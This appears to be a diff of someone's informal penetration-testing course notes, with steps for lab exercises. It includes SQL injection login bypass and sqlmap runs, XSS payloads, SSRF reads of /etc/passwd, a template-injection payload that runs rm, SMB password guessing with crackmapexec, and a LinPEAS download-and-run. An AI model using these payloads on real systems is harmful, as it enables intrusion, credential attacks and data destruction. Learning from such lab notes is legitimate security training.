@@ -10,6 +10,7 @@ dirb http://<Kali Ip>/
 OSINTframework.com, idcrawl.com, whatsmyname.me, spokeo.com, facecheck.id, haveibeenpwned.com, abuseipdb.com, opencorporates.com, ahmia.fi 
 3)
 wappalyzer extension, virustotal.com, who.is, dnsdumpster.com, www.shodan.io, github.com, web.archive.org, exif.tools, mapillary.com, https://livingatlas.arcgis.com/wayback/ 
+=================================
 4)
 Metasploit auxiliary
 ---------------------------------
@@ -84,6 +85,7 @@ run
 	-start Burpsuite
 	-Enter Email[administrator] and password
 	-change Burpsuite paswword [after usnername clear all]administrator'--
+=================================
 7)SQL injection attack using sqlmap tool
 SQL Injection kali
 1.sqlmap -u http://testphp.vulnweb.com --crawl 2 --batch 
@@ -101,6 +103,7 @@ SQL Injection kali
 	- clcik a serch button
 	- Burpsuite serch after <img>"><svg onload=alert(1)></img>
 	<script>alert(1)</script>[search bar]
+=================================
 9)SSRF URL search vulnerability
 sudo service apache2 start
 sudo service apache2 status
@@ -119,3 +122,60 @@ http:// 192.168.1.4/ssrf.php?url=/../../../../../../../../etc/passwd  [in browse
 192.168.1.4/ssrf.php?url=file:///etc/passwd
 192.168.1.4/ssrf.php?url=file:///etc/fusc.conf
 192.168.1.4/ssrf.php?url=file:///var/www/html/admin.html
+=================================
+10)SSTI
+Access lab
+View detail & capture the request of Unfortunately this product is out of stock
+Unfortunately,... this req right click & send t repeter
+On repeter page send button clcik then open responce code
+on repter page in request side select seesion id send to intruder 
+open intruder page and pasete <%= 7*7 %> in payload
+then go to setting
+go to grap extract and click add button & on html select 57 line then ok
+start attcak
+then go to repeter page select line 59 [below the setting icon select Auto-scroll]
+on repeter page request side write <%= system("rm /home/carlos/morale.txt") %> insted of Unfortunately stock message
+after send request
+=================================
+11)Docker
+task: create one container in download is ngx [server]and scan vul.. in this website
+1. docker version
+2. docker info
+3.docker run hello-world
+4. docker run -d --name my-nginx -p 8080:80 nginx
+5. docker ps
+6. docker start my-nginx
+7.docker exec -it my-nginx /bin/bash
+	apt-get update
+	apt-get install nano -y
+	/usr/share/nginx/html/
+	exit
+8.docker pull aquasec/trivy
+9.docker run -v /var/run/docker.sock:/var/run/docker.sock aquasec/trivy image nginx
+=================================
+12)SMB
+sudo systemctl start smbd.service
+sudo smbpasswd -a USERNAMEOFKALI
+sudo nano /etc/samba/smb.conf
+	[New_Share]
+	comment = demo
+	path = /home/venom/Desktop
+	browswable = no
+	read only = yes
+	valid user = kali
+	guest ok = no
+crackmapexec smb 10.0.2.15 -u venom -p pass.txt
+Windows+R write " \\ip-of-kali "
+=================================
+13)RDP
+setting
+go to remote desktop
+go to kali 
+xfreerdp3 /v:TargetIP /u:Administrator /p:12345
+OR EXTRA NOT USE
+mstsc.exe /v:<IP>
+=================================
+14)LinPEAS (Linux Privilege Escalation Awesome Script)
+wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+chmod 777 linpeas.sh
+/.linpeas.sh
